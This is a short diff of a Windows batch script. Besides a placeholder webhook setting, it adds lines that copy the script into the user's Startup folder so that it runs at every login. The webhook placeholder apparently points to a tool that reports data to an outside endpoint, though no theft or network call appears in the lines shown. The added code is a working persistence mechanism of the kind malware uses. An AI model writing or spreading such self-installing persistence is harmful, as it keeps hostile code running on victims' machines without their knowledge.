@@ -5,7 +5,9 @@
 ::replace the YOURWEBHOOK field with your webhook
 set webhook=YOURWEBHOOK
 
-
+:: copy to startup
+set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"
+if not exist "%startup%" (xcopy "%~dpnx0" "%startup%")
 
 
 :check_Permissions
